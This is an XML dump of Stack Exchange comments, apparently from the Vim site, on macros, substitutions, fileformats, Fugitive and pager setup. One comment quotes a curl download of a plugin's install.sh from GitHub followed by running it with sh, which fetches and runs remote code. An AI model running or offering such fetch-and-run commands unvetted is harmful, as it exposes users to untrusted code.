  <row Id="6978" PostId="4637" Score="2" Text="@PhilippFrank I will frequently search and replace the same pattern with different ones in various blocks of text. With such a macro, selecting the block, writing the actual search pattern and placing the cursor on the good position for typing the replacement chain can be made automatically. When I play it, it'll select the block, enter command mode, type `:'&lt;,'&gt;s/toBeReplaced//g` then put the cursor between the two `//` so that all I have to do is to type `newString&lt;cr&gt;` and I'm done. :)" CreationDate="2015-09-04T09:26:02.330" UserId="2978" />
  <row Id="6979" PostId="4637" Score="0" Text="So it's like a macro with a parameter. Very nice idea, thank you!" CreationDate="2015-09-04T09:36:58.997" UserId="1296" />
  <row Id="6980" PostId="4637" Score="0" Text="@PhilippFrank kind of, yeah. I'm glad you like it. :)" CreationDate="2015-09-04T09:37:52.653" UserId="2978" />
  <row Id="6981" PostId="4629" Score="0" Text="I don't think there is a more recent version than 7.4 (704) is there?" CreationDate="2015-09-04T10:28:10.303" UserId="3023" />
  <row Id="6982" PostId="4635" Score="1" Text="Or don't do it in Vim - use a system keyboard logger (started/stopped from Vim) and parse that output." CreationDate="2015-09-04T11:35:57.660" UserId="1800" />
  <row Id="6985" PostId="4619" Score="0" Text="@ChristianBrabandt I was not talking about wrapping in a buffer. Despite your assertion, such a function would make much sense for me." CreationDate="2015-09-04T13:41:27.350" UserId="985" />
  <row Id="6986" PostId="4614" Score="0" Text="2147483647 certainly is *much* closer to zero than to infinity. So, to represent infinity with such a *small* number doesn't seem helpful, at least not to me." CreationDate="2015-09-04T13:43:30.743" UserId="985" />
  <row Id="6987" PostId="4638" Score="0" Text="@VanLaser: could you give a little more details about the line `:let @q = @q[:-2]` please? Especially how does `[:-2]` work? :-)" CreationDate="2015-09-04T13:57:44.630" UserId="1841" />
  <row Id="6988" PostId="4638" Score="0" Text="It's &quot;slicing&quot; and works on lists, and strings (which is how I access/set `@q` above). Some examples [here](http://learnvimscriptthehardway.stevelosh.com/chapters/35.html#slicing)" CreationDate="2015-09-04T14:02:46.040" UserId="1800" />
  <row Id="6990" PostId="4629" Score="1" Text="Yes, 7.4 with all the patches written from its release until now ... http://ftp.vim.org/pub/vim/patches/7.4/README" CreationDate="2015-09-04T15:04:32.327" UserId="1800" />
  <row Id="6991" PostId="4643" Score="0" Text="One problem with `&lt;C-z&gt;` is that the Vim process is suspended by the OS: it's not doing anything (including responding to server commands)." CreationDate="2015-09-04T15:15:51.323" UserId="51" />
  <row Id="6992" PostId="4643" Score="0" Text="Would it help to use `:shell` with `exit` instead or is vim suspended here too?" CreationDate="2015-09-04T15:18:05.843" UserId="3282" />
  <row Id="6993" PostId="4643" Score="1" Text="@Carpetsmoker, what do you expect your text editor to do when you are not using it?" CreationDate="2015-09-04T15:35:07.670" UserId="54" />
  <row Id="6994" PostId="4643" Score="0" Text="@romainl Well, for example I have a script which will focus the Vim session editing a particular file; this will hang on suspended Vim processes..." CreationDate="2015-09-04T15:39:55.117" UserId="51" />
  <row Id="6995" PostId="4629" Score="0" Text="Is there a way to get an updated binary/build? Downloading from the main site the latest updated build is Jul 2013. Some of the patches you showed contain very recent updates. Am I supposed to compile the source? or..? [Edit] it seems that vim has finally moved to github!" CreationDate="2015-09-04T15:49:20.510" UserId="3023" />
  <row Id="6996" PostId="4643" Score="1" Text="That's not a problem with `&lt;C-z&gt;`, that's a problem with your script." CreationDate="2015-09-04T15:56:35.087" UserId="54" />
  <row Id="6997" PostId="4642" Score="0" Text="Yeah, I do have this one as well. In my specific use case, however, the `toBeReplaced` pattern is not as simple as &quot;the word under cursor&quot;, which is why I need a small, specific macro that I could create on the go. And then again: too much specific for a map :\ Thank you anyway :)" CreationDate="2015-09-04T16:42:50.983" UserId="2978" />
  <row Id="6998" PostId="4638" Score="0" Text="@VanLaser they truly look cryptic. There are useful however for repeating, sophisticated little things you need'a do in very specific cases.. you know this kind of problems that appear only once and only last for a few minuts. Being able to deal with them by creating macros on the fly and without having to write and debug a dedicated function is just.. woo so wonderful! ^ ^" CreationDate="2015-09-04T16:52:24.413" UserId="2978" />
  <row Id="6999" PostId="4638" Score="0" Text="@lago-lito - yes, that's pretty cool :) The neurotic in me will always try to generalize the situation and make a (who knows when) reusable piece of scripting instead :D" CreationDate="2015-09-04T19:11:32.337" UserId="1800" />
  <row Id="7000" PostId="4642" Score="2" Text="Perhaps, put the pattern in a register, then adapt the above mapping to automatically get the register content as the `toBeReplaced` part (instead of current word under cursor, which is more limiting)." CreationDate="2015-09-04T19:13:26.850" UserId="1800" />
  <row Id="7003" PostId="4642" Score="1" Text="@VanLaser Right, that would allow for a general mapping, and would make it much simpler as well: `va{:s/&lt;C-r&gt;0//g&lt;Left&gt;&lt;Left&gt;` With this you can yank whatever pattern you need before-hand, and then just press the mapped key to replace that pattern with something in the current block." CreationDate="2015-09-04T20:13:59.303" UserId="2659" />
  <row Id="7004" PostId="4629" Score="1" Text="Yes. I recommend [this one](http://www.kaoriya.net/software/vim/) - the &quot;Win 64bit&quot; link. After extraction, remove the 'vimrc' and 'gvimrc' files from the main folder. Alternatively, there is https://bintray.com/veegee/generic/vim_x64/" CreationDate="2015-09-04T20:33:29.923" UserId="1800" />
  <row Id="7006" PostId="3517" Score="0" Text="How about aligning all other non-current lines to the left?" CreationDate="2015-09-05T07:20:24.693" UserId="4426" />
  <row Id="7007" PostId="3517" Score="0" Text="@RafiB. I don't understand your commment?" CreationDate="2015-09-05T10:50:04.840" UserId="51" />
  <row Id="7008" PostId="4644" Score="2" Text="As a non-neovim user, shell windows do seem awfully emacs-like... :)" CreationDate="2015-09-05T12:03:07.290" UserId="1430" />
  <row Id="7009" PostId="4646" Score="3" Text="Good luck getting anything done in two 39x12 (or 39x24!) windows ;-)" CreationDate="2015-09-05T13:47:07.460" UserId="54" />
  <row Id="7010" PostId="4629" Score="0" Text="Thanks for your help. My AV is flagging the exe from the latter link. The first link works. I ended up using the 32 bit cause it was the only version I was able to find a working gvimfullscreen dll (https://github.com/derekmcloughlin/gvimfullscreen_win32/tree/master), it's really silly to have to go through all this to get a working gvim binary with fullscreen. There's one that works with the 64bit version but has those annoying white borders https://github.com/xqin/gvimfullscreen if you happen to know a flawless way of fullscreen that works in x64 I'd appreciate it" CreationDate="2015-09-05T13:59:13.350" UserId="3023" />
  <row Id="7011" PostId="4628" Score="0" Text="not accros the full width of the window. I only have one dash at the start. but thanks, that's where I have to look at." CreationDate="2015-09-05T18:25:36.507" UserId="1682" />
  <row Id="7012" PostId="4651" Score="0" Text="No need to justify yourself: vim-gnome *is* the only package worth installing on Ubuntu." CreationDate="2015-09-05T20:29:10.217" UserId="54" />
  <row Id="7014" PostId="4651" Score="0" Text="Apparently Neovim is only going to ship with the one, full version - none of this cut-down nonsense!" CreationDate="2015-09-05T21:07:01.477" UserId="859" />
  <row Id="7016" PostId="292" Score="0" Text="@baxx Obsession does remember all kinds of splits. Maybe you closed the split before quitting vim?" CreationDate="2015-09-06T04:27:05.430" UserId="53" />
  <row Id="7017" PostId="4628" Score="0" Text="Yes, across the full width of the window. Example: `vim -N -u NONE -c &quot;set foldtext=v:folddashes&quot; -c &quot;put=''&quot; -c &quot;normal ggzfG&quot;`" CreationDate="2015-09-06T05:34:02.367" UserId="2055" />
  <row Id="7018" PostId="4629" Score="0" Text="This might work, has both dlls included: https://github.com/xolox/vim-shell (needs https://github.com/xolox/vim-misc as dependency). Although I remember it still might have the white borders." CreationDate="2015-09-06T09:10:46.617" UserId="1800" />
  <row Id="7019" PostId="4655" Score="0" Text="Perfect. Thanks" CreationDate="2015-09-06T14:10:03.717" UserId="3354" />
  <row Id="7020" PostId="4660" Score="0" Text="You still have to remove the &lt;C-f&gt; character (`^F`) from the end of the macro, right? At least that's what I see." CreationDate="2015-09-06T16:08:59.383" UserId="1800" />
  <row Id="7021" PostId="4660" Score="0" Text="Almost there! *Really* useful (I didn't know about the command line window but it's great), but.. aargh! It seems like entering this windows from insert mode looses your selected area. Is there a way to make the command you launch from the command line window work on a selected area?" CreationDate="2015-09-06T16:12:02.603" UserId="2978" />
  <row Id="7022" PostId="4630" Score="0" Text="Do you have a source for the last paragraph? Integer division by zero is undefined in C, any behaviour you see is dependent on the processor, etc." CreationDate="2015-09-06T16:13:32.920" UserId="205" />
  <row Id="7023" PostId="4660" Score="0" Text="@VanLaser No, since you can go on with typing your command in the command-line window. Your macro will be like `qqSTARTMACRO:STARTCOMMANDLINEPART&lt;c-f&gt;i&lt;c-o&gt;q` and so the recording has actually stopped while your were typing the command part. To use the macro: `@qFINISHYOURCOMMAND&lt;cr&gt;` and you're done: no need to edit it. Unfortunately, this does not seem to work from visual mode (or it looses the selection).. or have I missed something?" CreationDate="2015-09-06T16:17:50.983" UserId="2978" />
  <row Id="7024" PostId="4660" Score="0" Text="Ah, right :) BTW, I could select a visual range, then do `@q` and the range was added at command start `'&lt;,'&gt;` - as long as the macro started with `:` ...." CreationDate="2015-09-06T16:30:29.483" UserId="1800" />
  <row Id="7025" PostId="4630" Score="0" Text="Oh, you're right.  I'm removing the paragraph." CreationDate="2015-09-06T18:32:25.607" UserId="3396" />
  <row Id="7026" PostId="4660" Score="0" Text="@lago-lito Actually, it looks like even if you don't see your selection, the specified range (i.e. `'&lt;,'&gt;`) still matches the selection when validating the command." CreationDate="2015-09-06T19:11:24.720" UserId="4437" />
  <row Id="7028" PostId="4665" Score="0" Text="well, I agree &lt;kbd&gt;p&lt;/kbd&gt; is the most used put operation, but it's behaviour is always assuming a lot in how and where to put. Putting something taken by &lt;kbd&gt;C-v&lt;/kdb&gt; will behave differently than when it's taken by &lt;kbd&gt;yiw&lt;/kdb. and yet differently than with &lt;kbd&gt;yy&lt;/kbd&gt;, which might not always be the preferred way to put. So the default &lt;kbd&gt;p&lt;/kbd&gt; seems odd and not in line with general behaviour. The operator replace sounds interesting though, I'll give it a try ;-)" CreationDate="2015-09-06T23:54:59.267" UserId="4434" />
  <row Id="7029" PostId="4667" Score="0" Text="1. Why not set the `fileformat` to `unix` and use `:%s/\S/\r&amp;/g`? 2. Do you want to those leading spaces in front of each line given in the example output? 3. Your attempt will leave trailing whitespace, if used as intended. Do you want that?" CreationDate="2015-09-07T05:52:07.087" UserId="205" />
  <row Id="7030" PostId="4667" Score="0" Text="@muru. Thanks for suggesting setting format to unix. After doing that, and trying your suggestion, I  get a new line after each character not each word. Yes, I'm content with leaving trailing white space. I can use a second command to clean those." CreationDate="2015-09-07T06:00:40.983" UserId="1132" />
  <row Id="7031" PostId="4667" Score="1" Text="Oh, wait. You want `&lt;CR&gt;` line endings, so the `fileformat` would be `mac`, not `unix` - sorry about that. Ok, instead of replacing non-whitespace characters with themselves, replace whitespace characters: `:%s/\s\+/\r/g`" CreationDate="2015-09-07T06:09:35.210" UserId="205" />
  <row Id="7032" PostId="4667" Score="0" Text="I just tried your second suggestion on ff=unix and that worked. Thanks." CreationDate="2015-09-07T06:14:36.233" UserId="1132" />
  <row Id="7033" PostId="4667" Score="2" Text="When replacing with `\r`, Vim will pick the correct line ending for the `fileformat`, so it will always appear to work. If you wanted OSX line endings, I think you should use `ff=mac`. Check the content of the file using `od` or `hexdump` to be sure." CreationDate="2015-09-07T06:16:32.087" UserId="205" />
  <row Id="7034" PostId="4666" Score="3" Text="I don't think gVim supports transparency. Only MacVim does. There's a patch mentioned in the TODO list which supposedly adds transparency only for gVim in Windows. You might have to use tricks like the one in https://wiki.archlinux.org/index.php/Per_Application_Transparency (which mentions gVim)." CreationDate="2015-09-07T06:27:44.270" UserId="205" />
  <row Id="7035" PostId="4665" Score="0" Text="You asked about a rationale: yank &quot;something&quot; (range) != put &quot;somewhere&quot; (position). If `p` would accept a range (motion, text-object), you couldn't use `p` alone. I'm not saying that I like it, that I agree with it etc. - it's just why I think it is like it is." CreationDate="2015-09-07T10:31:22.247" UserId="1800" />
  <row Id="7037" PostId="4660" Score="0" Text="Hey, but you're right! Awesome! Then we got our solution: slack a `cnoremap &lt;c-q&gt; &lt;c-f&gt;i&lt;c-o&gt;q` in you .vimrc, then use `&lt;c-q&gt;` in command mode to stop recording :) Thank you fflorent!" CreationDate="2015-09-07T11:56:28.880" UserId="2978" />
  <row Id="7038" PostId="4668" Score="0" Text="I'm not sure I understood clearly what you want but maybe the option `scrolloff` is what you're looking for: if you `set scrolloff=10` you will always have 10 lines between your cursor and the bottom of the window when you scroll down, is that what you're talking about?" CreationDate="2015-09-07T17:33:06.910" UserId="1841" />
  <row Id="7040" PostId="4649" Score="1" Text="To execute commands on powershell you could use `set shell=powershell` and `set shellcmdflag=-command`" CreationDate="2015-09-07T18:52:37.487" UserId="1453" />
  <row Id="7041" PostId="4658" Score="0" Text="`:set lines=1000 columns=100` just mixes up the layout (please, try it yourself), a little less if I only set the number of lines. Could you explain your approach with `screen`? It's been ages since I last used it." CreationDate="2015-09-07T18:53:14.957" UserId="4432" />
  <row Id="7042" PostId="4657" Score="0" Text="Did the trick - thanks!" CreationDate="2015-09-07T20:43:50.453" UserId="859" />
  <row Id="7043" PostId="4663" Score="0" Text="Thanks for your help; I appreciate it." CreationDate="2015-09-07T21:18:19.537" UserId="4442" />
  <row Id="7044" PostId="4667" Score="0" Text="@muru Mac OS X is Unix-based and understands Unix line-endings. The `mac` fileformat is obsolete since the Mac OS 9 days and only kept around for backward compatibility (or, more probably, because cleaning up Vim's legacy code can be an [unrewarding experience](http://geoff.greer.fm/2015/01/15/why-neovim-is-better-than-vim/) to say the least)." CreationDate="2015-09-07T22:13:07.310" UserId="3079" />
  <row Id="7045" PostId="4667" Score="0" Text="@zool Thanks for the update. Never used a Mac myself. :)" CreationDate="2015-09-07T22:13:57.110" UserId="205" />
  <row Id="7047" PostId="4668" Score="0" Text="@statox tried to clarify. Thanks for the hint though" CreationDate="2015-09-08T06:42:47.540" UserId="3322" />
  <row Id="7048" PostId="4672" Score="4" Text="`b:foo` is local to whatever buffer is the current buffer and yes, your autocommands will run for every file." CreationDate="2015-09-08T07:29:02.830" UserId="54" />
  <row Id="7049" PostId="4663" Score="0" Text="If you do appreciate my help, you can accept my answer and vote it up ;-) otherwise you're welcome!" CreationDate="2015-09-08T08:04:06.250" UserId="4434" />
  <row Id="7050" PostId="4674" Score="0" Text="Really, the easiest way would be to slightly rename a snippet (or both) - if they are so specialized." CreationDate="2015-09-08T11:00:47.970" UserId="1800" />
  <row Id="7051" PostId="4673" Score="0" Text="Well, it's probably because when you create a new tab, you are also in a new buffer ... and `:Gstatus` needs the *current* buffer to be under version control (git)." CreationDate="2015-09-08T11:07:44.750" UserId="1800" />
  <row Id="7052" PostId="4673" Score="0" Text="I understand, but if I run the `Gstatus` command by hand after the `newtab` the command runs without problem" CreationDate="2015-09-08T11:09:09.747" UserId="1821" />
  <row Id="7053" PostId="4673" Score="0" Text="I just tested (with `tabnew`) and it doesn't. This is consistent with the docs `:h fugitive-commands`" CreationDate="2015-09-08T11:11:31.060" UserId="1800" />
  <row Id="7054" PostId="4673" Score="0" Text="My bad, it doesn't. I must have tested with a file open. I edited my question" CreationDate="2015-09-08T11:13:29.537" UserId="1821" />
  <row Id="7055" PostId="4673" Score="0" Text="BTW, `Gstatus` *should not* work without a file, even if in the right folder. It's the first item on the FAQ: https://github.com/tpope/vim-fugitive" CreationDate="2015-09-08T11:20:59.807" UserId="1800" />
  <row Id="7056" PostId="4673" Score="0" Text="Right, but as my edit stated, the `Gstatus` work event when I open vim without a file... Can it be a config-specific trouble ?" CreationDate="2015-09-08T11:25:03.810" UserId="1821" />
  <row Id="7057" PostId="4673" Score="0" Text="Does it work anytime you are in a git directory, afterwards (i.e. during a Vim session, no loaded buffers)? In any case, the docs specifically say that that is not the intended behavior. So, I don't know what do you expect." CreationDate="2015-09-08T11:29:31.493" UserId="1800" />
  <row Id="7058" PostId="4673" Score="0" Text="I tried the following : `vim tracked_file` : `Gstatus` works. Then I open a new buffer and I close the existing one with `new` and `quit`. And now the `Gstatus` doesn't work." CreationDate="2015-09-08T11:31:54.510" UserId="1821" />
  <row Id="7059" PostId="4675" Score="1" Text="&quot;Command mode&quot; is a synonym for &quot;normal mode&quot;. Did you mean &quot;command-line mode&quot;?" CreationDate="2015-09-08T11:43:08.220" UserId="54" />
  <row Id="7060" PostId="4673" Score="0" Text="Yes, `Gstatus` *only* works with a tracked file loaded as the current buffer ..." CreationDate="2015-09-08T11:51:45.270" UserId="1800" />
  <row Id="7061" PostId="1910" Score="1" Text="+1 because there's always a Tim Pope's plugin I didn't know about." CreationDate="2015-09-08T11:59:52.800" UserId="3079" />
  <row Id="7062" PostId="4675" Score="0" Text="@romainl, yes, it should be `command-line mode`, I've edited the content." CreationDate="2015-09-08T12:24:36.740" UserId="3085" />
  <row Id="7063" PostId="4677" Score="0" Text="Brilliantly simple love it." CreationDate="2015-09-08T12:54:02.940" UserId="3322" />
  <row Id="7067" PostId="4678" Score="1" Text="Can you please summarize the article you mentioned in your answer?" CreationDate="2015-09-08T16:08:08.413" UserId="865" />
  <row Id="7068" PostId="4681" Score="3" Text="Or, purely in terms of commands, `:Gstatus | wincmd T`." CreationDate="2015-09-08T16:41:38.667" UserId="205" />
  <row Id="7069" PostId="4665" Score="0" Text="A few other plugin options: [ReplaceWithRegister](http://www.vim.org/scripts/script.php?script_id=2703) and [regreplop.vim](http://www.vim.org/scripts/script.php?script_id=2702)." CreationDate="2015-09-08T17:12:33.190" UserId="778" />
  <row Id="7070" PostId="4669" Score="0" Text="If you think you can have some use for pandoc, you can check (at least) the syntax plugin: https://github.com/vim-pandoc/vim-pandoc-syntax . It will show bold as bold, italic as italic (or IIRC with different background color in terminals without italic support). Or at least you can check its syntax for hints." CreationDate="2015-09-08T17:43:08.157" UserId="1800" />
  <row Id="7071" PostId="4663" Score="0" Text="Accepted! I attempted to vote it up but there are restrictions for newbs; gotta get 15 rep before I can vote, sorry man." CreationDate="2015-09-08T18:11:28.653" UserId="4442" />
  <row Id="7072" PostId="4682" Score="0" Text="Why use an editor as a pager?" CreationDate="2015-09-08T18:58:52.873" UserId="54" />
  <row Id="7073" PostId="4682" Score="0" Text="@romainl why not? `less` is OK, but not good enough to be `man`'s pager." CreationDate="2015-09-08T19:00:28.360" UserId="205" />
  <row Id="7074" PostId="4682" Score="0" Text="Using `export MANPAGER='vim -c &quot;%! col -b&quot; -c &quot;set ft=man nomod nolist ignorecase&quot; -'` or `export MANPAGER=&quot;vim -&quot;` I see no problem? `man ls` opens the manpage as-expected." CreationDate="2015-09-08T19:29:53.903" UserId="51" />
  <row Id="7075" PostId="4682" Score="0" Text="@Carpetsmoker and after you close it?" CreationDate="2015-09-08T19:30:33.507" UserId="205" />
  <row Id="7076" PostId="4682" Score="0" Text="Please explain &quot;not good enough to be `man`'s pager&quot;." CreationDate="2015-09-08T19:32:09.707" UserId="54" />
  <row Id="7077" PostId="4682" Score="0" Text="Nope, don't see anything..." CreationDate="2015-09-08T19:32:23.883" UserId="51" />
  <row Id="7078" PostId="4682" Score="0" Text="@romainl Come to [chat] for that." CreationDate="2015-09-08T19:32:30.833" UserId="205" />
  <row Id="7079" PostId="4682" Score="0" Text="@Carpetsmoker which version of Vim are you using? What about `echo foo | vim -Nu NONE -`" CreationDate="2015-09-08T19:33:55.790" UserId="205" />
  <row Id="7080" PostId="4678" Score="0" Text="See you? It is very important, if single-link answers would be okay, some years later this site would be full with deleted links. But if you only copy an important part of the link you refer, _and_ give also the link where the OP can get further infos, it is okay." CreationDate="2015-09-08T21:00:54.383" UserId="28" />
  <row Id="7081" PostId="4686" Score="0" Text="No error message I could trap but that points me to the right place to look thanks. It explains why &amp;fe was never true." CreationDate="2015-09-09T06:26:04.893" UserId="1313" />
  <row Id="7082" PostId="4683" Score="1" Text="You should use scoping for variables. For example `let l:fs = 0` makes `fs` as a local variable for your function and prevent you from interact with global, options etc." CreationDate="2015-09-09T07:23:17.243" UserId="1145" />
  <row Id="7083" PostId="4665" Score="2" Text="I'm giving a try to kana's `operator-replace`, and it's very likely I'll like it, and I might actually consider replace `p` with it (and then `gp` with `p` to keep the old behaviour within easy reach) :-&gt;" CreationDate="2015-09-09T07:56:22.013" UserId="4434" />
  <row Id="7084" PostId="4687" Score="1" Text="When *is* `ALWAYS_USE_GUI` defined, do you know?" CreationDate="2015-09-09T08:46:17.117" UserId="205" />
  <row Id="7085" PostId="4687" Score="0" Text="see feature.h (it's done when ALWAYS_USE_GUI is not defined, so basically for all unix versions)." CreationDate="2015-09-09T08:54:37.520" UserId="71" />
  <row Id="7086" PostId="4682" Score="1" Text="better syntax highlighting" CreationDate="2015-09-09T08:55:08.560" UserId="71" />
  <row Id="7087" PostId="4669" Score="0" Text="What's the output of `:verbose highlight htmlBold` and `:verbose highlight htmlItalic`? These should be the default highlight groups if you're using the builtin markdown support." CreationDate="2015-09-09T10:13:25.553" UserId="3079" />
  <row Id="7089" PostId="4690" Score="0" Text="Ah, perfect, thank you! I had copied this incantation from a mapping - a bit too closely, it seems. Thanks." CreationDate="2015-09-09T15:29:54.267" UserId="91" />
  <row Id="7090" PostId="4691" Score="0" Text="An alternative solution would be to use python interpolation in your snippet, but I think the above is more in line with what you want." CreationDate="2015-09-09T16:55:01.187" UserId="680" />
  <row Id="7091" PostId="4682" Score="0" Text="In vim, `: help less` gives some info for using it as a pager." CreationDate="2015-09-09T13:24:01.347" UserId="4479" />
  <row Id="7092" PostId="4682" Score="0" Text="@mtklr true, but `$VIMRUNTIME/macros/less.sh` suffers from the same problem." CreationDate="2015-09-09T18:11:04.587" UserId="205" />
  <row Id="7093" PostId="4683" Score="0" Text="Variables inside a function are local by default.  You have to use `g:` to access global variables." CreationDate="2015-09-09T20:40:25.880" UserId="15" />
  <row Id="7095" PostId="4651" Score="0" Text="`nnoremap &lt;F1&gt; :echo &quot;something useful&quot;&lt;CR&gt;` works perfectly without doing anything weird." CreationDate="2015-09-05T20:33:48.347" UserId="54" />
  <row Id="7096" PostId="4654" Score="0" Text="So I take it that the main motivation is scrolling with your mouse instead of within vim? You could try `:set mouse=a` to scroll within vim with your mouse or use gvim/macvim. I know it's not exactly what you asked, but I figured I'd float the idea out there in case it meets your needs." CreationDate="2015-09-09T23:23:59.963" UserId="680" />
  <row Id="7097" PostId="4658" Score="0" Text="https://www.gnu.org/software/screen/manual/screen.html#Window-Size" CreationDate="2015-09-09T23:26:39.617" UserId="680" />
  <row Id="7098" PostId="4685" Score="2" Text="Note that fuse-zip wil stores all changed &amp; added files in memory, and writes them to the zip file on unmount. This is why it's so fast. But has the obvious downsides that 1) It uses a lot of memory with many changes, and 2) it's vital that you don't forget to umount! (which may be a problem if fuse-zip gets killed when  the system runs out of memory due to *1*)." CreationDate="2015-09-09T23:44:57.940" UserId="51" />
  <row Id="7099" PostId="4669" Score="0" Text="I have the same problem when I use `vim` from `xterm` with `markdown` or `html` files. But if I start `tmux` inside the same `xterm` it works as expected. Doing `:set ft=html` seems to fix it (the `filetype` already was HTML).  `:highlight htmlBold` says `cleared` *but many other `html*` highlights are fine) ... Not sure what's going on here." CreationDate="2015-09-10T00:13:12.833" UserId="51" />
  <row Id="7100" PostId="4694" Score="0" Text="I have updated the question with more examples including this one." CreationDate="2015-09-10T07:26:59.207" UserId="237" />
  <row Id="7101" PostId="4695" Score="0" Text="You can have a look at this article : http://vim.wikia.com/wiki/Using_vim_as_calculator" CreationDate="2015-09-10T08:52:34.230" UserId="1821" />
  <row Id="7102" PostId="4693" Score="0" Text="What happens if you use *single* quotes?" CreationDate="2015-09-10T09:02:28.753" UserId="1800" />
  <row Id="7103" PostId="4654" Score="0" Text="@MattBoehm, as I said, the main motivation is to keep the changes on screen so I can review them if necessary." CreationDate="2015-09-10T09:29:44.713" UserId="4432" />
  <row Id="7104" PostId="4658" Score="0" Text="@zmo, I use the trackpad, not a mouse. I want to keep changes on-screen. That's why I mentioned I disabled `alternate screen`." CreationDate="2015-09-10T09:31:51.190" UserId="4432" />
  <row Id="7105" PostId="4694" Score="0" Text="@firedev Try `:Ag \\\$`. '\\' to escape '\' and '\$' to escape `$`. `:Ag '\$'` (with single quotes) also works if you don't want a ton of slashes. EDIT: Ugh, same stuff here...." CreationDate="2015-09-10T12:09:18.270" UserId="20" />
  <row Id="7106" PostId="4694" Score="0" Text="For %. That requires double slashes inside single quotes and four outside: `:Ag '\\%'` or `:Ag \\\\%`." CreationDate="2015-09-10T12:27:30.807" UserId="20" />
  <row Id="7107" PostId="4698" Score="0" Text="Use netrw, Luke. `:he netrw`" CreationDate="2015-09-10T14:52:26.610" UserId="1145" />
  <row Id="7108" PostId="4699" Score="0" Text="For some reason I only managed to use your solution with double quotes `&quot;` instead single quotes `'` on the `substitute` command. Do you know if is there any reason for that ?" CreationDate="2015-09-10T19:52:32.540" UserId="1453" />
  <row Id="7109" PostId="4699" Score="0" Text="@vappolinario it works both ways for me, so I'm afraid I don't know, sorry." CreationDate="2015-09-10T20:17:46.803" UserId="978" />
  <row Id="7110" PostId="4245" Score="0" Text="This is not possible" CreationDate="2015-09-10T20:22:57.593" UserId="71" />
  <row Id="7111" PostId="4701" Score="0" Text="Arrg! Most of time it is a multiple line prenote. But maybe your tip could help a bit." CreationDate="2015-09-10T20:39:06.930" UserId="4492" />
  <row Id="7112" PostId="4701" Score="0" Text="It solved my problem" CreationDate="2015-09-10T21:46:11.480" UserId="4492" />
  <row Id="7113" PostId="4703" Score="0" Text="You could *probably* fit a `\=substitute()` inside the replacement part, similar to http://vi.stackexchange.com/a/3927/1800 (minus the looping part; to remove all the `\index` commands at once)." CreationDate="2015-09-10T22:28:00.053" UserId="1800" />
  <row Id="7114" PostId="4703" Score="0" Text="@VanLaser Yes! Or like http://vi.stackexchange.com/questions/4432/how-to-replace-all-space-with-for-the-first-quoted-string/4434#4434, but like I said, this writer needs to see a sunset and a sunrise first :)" CreationDate="2015-09-10T23:00:15.780" UserId="1306" />
  <row Id="7115" PostId="4703" Score="0" Text="`:s/^You/One` ^  - Roger that &amp; Good night! :)" CreationDate="2015-09-10T23:21:39.383" UserId="1800" />
  <row Id="7116" PostId="4703" Score="0" Text="@VanLaser It was, thank you :) I was not able to use `\=substitute()` because I couldn't figure out how to match and pass the entire `\footcite[]` to `substitute()` when it contains nested `[]`, that is, how to match to _the correct_ `]`. This seems like it would be a common problem, but I couldn't figure it out. Syntax files solve it for `{}` by making many overlapping matches, but do you know how to do it in a single match?" CreationDate="2015-09-11T07:54:46.560" UserId="1306" />
  <row Id="7117" PostId="4703" Score="0" Text="`:normal f[v%` could probably help to select a good range, if cursor is on a `footcite`. Then something like `:'&lt;,'&gt;s/\%Vindex ...` to select the exact range (lines &amp; columns) for substitution." CreationDate="2015-09-11T10:33:51.413" UserId="1800" />
  <row Id="7118" PostId="4707" Score="2" Text="*Maybe* `set virtualedit=all` (but read about it first: `:h virtualedit`)" CreationDate="2015-09-11T12:33:13.603" UserId="1800" />
  <row Id="7119" PostId="4709" Score="0" Text="Unfortunately [this answer](http://superuser.com/a/575529/386795) might be a bad news for you. TL;DR version: Vim syntax file are very specifics to vim and relies on vimscript language so it's really a pain to convert or import from another editor." CreationDate="2015-09-11T14:01:57.210" UserId="1841" />
  <row Id="7120" PostId="4698" Score="0" Text="To edit files remotely you have several solutions: use the built-in explorer `netrw` as suggested by Alex, mounting your remote folder locally thanks to [SshFs](https://en.wikipedia.org/wiki/SSHFS) or using [scp within vim](http://vim.wikia.com/wiki/Edit_remote_files_locally_via_SCP/RCP/FTP)." CreationDate="2015-09-11T14:23:38.847" UserId="1841" />
  <row Id="7121" PostId="4709" Score="1" Text="It's often not that difficult to program *basic* syntax highlighting for most file types." CreationDate="2015-09-11T15:25:45.237" UserId="51" />
  <row Id="7122" PostId="4709" Score="0" Text="I'm not sure if my comment was clear: the pain I was talking about was from the &quot;automatic&quot; conversion, not from writing the file manually from scratch which is as Carpetsmoker said pretty accessible." CreationDate="2015-09-11T15:59:15.857" UserId="1841" />
  <row Id="7123" PostId="4710" Score="0" Text="How did you installed it? Did you used a plugin manager (If yes which one)? Also did you add some configuration for NeoBundle in your vimrc?" CreationDate="2015-09-11T17:31:23.557" UserId="1841" />
  <row Id="7124" PostId="4710" Score="0" Text="I used the `$ curl https://raw.githubusercontent.com/Shougo/neobundle.vim/master/bin/install.sh &gt; install.sh&#xA; $ sh ./install.sh ` script that gives the author and yes I added some configuration in order to include some packages. @statox" CreationDate="2015-09-11T17:33:19.097" UserId="3291" />
  <row Id="7125" PostId="4710" Score="0" Text="Arf I'm not clever today I mistook NeoBundle for NeoComplete, it would be stupid to use a plugin manger to install a plugin manager :-) I don't know this plugin manager well enough to be useful here, sorry." CreationDate="2015-09-11T17:38:36.377" UserId="1841" />
  <row Id="7126" PostId="4710" Score="0" Text="Don't worry. I think NeoComplete is a plugin from the same author Shougo but thanks either way. Have a nice day @statox. (:" CreationDate="2015-09-11T17:41:54.167" UserId="3291" />
  <row Id="7127" PostId="4710" Score="0" Text="Indeed that the same (great) author. Have a good one too." CreationDate="2015-09-11T17:44:56.470" UserId="1841" />
  <row Id="7128" PostId="4711" Score="0" Text="Please show us your `~/.vimrc`." CreationDate="2015-09-11T19:36:12.200" UserId="54" />
  <row Id="7129" PostId="4705" Score="0" Text="Thanks for `:sbuffer`, that's the kind of thing I was hoping for–and I notice that it works with `:vertical` as well. I added your 'juggling files' snippet recently and have since stopped using &quot;CmdtrolPT&quot;; the 'buffers' ones are new to me." CreationDate="2015-09-11T19:39:20.580" UserId="1306" />
  <row Id="7130" PostId="4705" Score="0" Text="I started this workflow because of frequent `:argdo` operations, and for projects with less than 30 or so files it has been pretty convenient. Maybe once `:find` becomes a habit, or I work on bigger projects, I'll change the flow more." CreationDate="2015-09-11T19:41:22.727" UserId="1306" />
